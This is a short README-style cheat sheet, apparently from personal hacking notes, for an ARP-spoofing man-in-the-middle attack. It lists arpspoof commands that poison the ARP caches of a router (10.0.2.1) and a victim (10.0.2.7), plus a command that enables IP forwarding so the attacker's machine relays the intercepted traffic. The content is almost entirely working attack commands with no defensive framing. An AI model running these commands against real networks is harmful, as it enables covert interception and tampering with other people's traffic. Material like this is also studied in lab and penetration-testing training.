# ArpSpoof

<img src="images/arpspoof.jpg" width="600" style="horizantal-align:middle">

### Deceive router
```
arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
```

### Deceive victim
```
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7
```

### Change attacker machin to a router
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
